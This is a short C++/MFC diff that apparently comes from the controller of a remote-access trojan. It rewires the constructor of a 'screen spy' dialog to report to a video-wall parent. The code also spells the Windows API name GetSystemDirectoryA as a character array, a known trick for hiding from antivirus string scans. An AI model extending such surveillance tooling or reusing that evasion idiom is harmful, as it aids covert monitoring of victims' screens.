@@ -59,7 +59,7 @@ enum
 #define SPI_SETSNAPSIZING   0x008F
 #endif
 
-CScreenSpyDlgSmall::CScreenSpyDlgSmall(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
+CScreenSpyDlgSmall::CScreenSpyDlgSmall(CVideoWall* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
 	: CDialog(CScreenSpyDlgSmall::IDD, pParent)
 {
 	//{{AFX_DATA_INIT(CScreenSpyDlgSmall)
@@ -73,8 +73,7 @@ CScreenSpyDlgSmall::CScreenSpyDlgSmall(CWnd* pParent, CIOCPServer* pIOCPServer, 
 	char nBhku[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
 //	GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),nBhku);
 	
-
-	m_pParent       = (CMainFrame*)GetParentFrame();
+	m_pParent = pParent;
 	m_iocpServer	= pIOCPServer;
 	m_pContext		= pContext;
 	m_bIsFirst		= true; // 如果是第一次打开对话框，显示提示等待信息
